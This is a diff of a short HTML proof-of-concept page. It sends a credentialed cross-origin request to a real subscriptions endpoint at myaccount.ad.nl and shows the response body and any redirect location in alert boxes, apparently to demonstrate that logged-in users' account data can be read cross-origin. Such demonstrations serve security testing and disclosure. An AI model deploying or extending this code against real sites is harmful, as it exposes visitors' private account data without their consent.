@@ -2,15 +2,25 @@
 <html><body>
 <script>
 var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+      // return if not ready state 4
+      if (this.readyState !== 4) {
+        return;
+      }
+
+      // check for redirect
+      if (this.status === 302 /* or may any other redirect? */) {
+        var location = this.getResponseHeader("Location");
+        alert(location);
+      } 
+
+      // return data
+      alert(this.responseText);
+  };
   xhttp.open("GET", "https://myaccount.ad.nl/rest/subscriptions.k");
   xhttp.withCredentials = true;
   xhttp.send();
-xhttp.onerror = function() {
-alert(xhttp.getResponseHeader("Location"));
-if(this.responseText == null)
-    {alert(this.getAllResponseHeaders());}
-else{alert(this.responseText);}
-  }
+
 </script>
 </body>
 </html>
